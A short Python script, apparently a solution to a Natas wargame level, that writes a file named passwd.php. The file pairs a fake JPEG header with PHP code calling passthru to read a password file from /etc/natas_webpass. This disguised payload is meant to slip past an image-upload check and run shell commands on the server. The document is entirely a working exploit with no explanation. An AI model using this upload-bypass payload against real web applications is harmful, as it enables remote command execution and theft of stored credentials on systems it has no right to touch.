file = open("passwd.php", "w")
file.write("\xFF\xD8\xFF\xE0" + "<? echo passthru('cat /etc/natas_webpass/natas14') ?>")
file.close()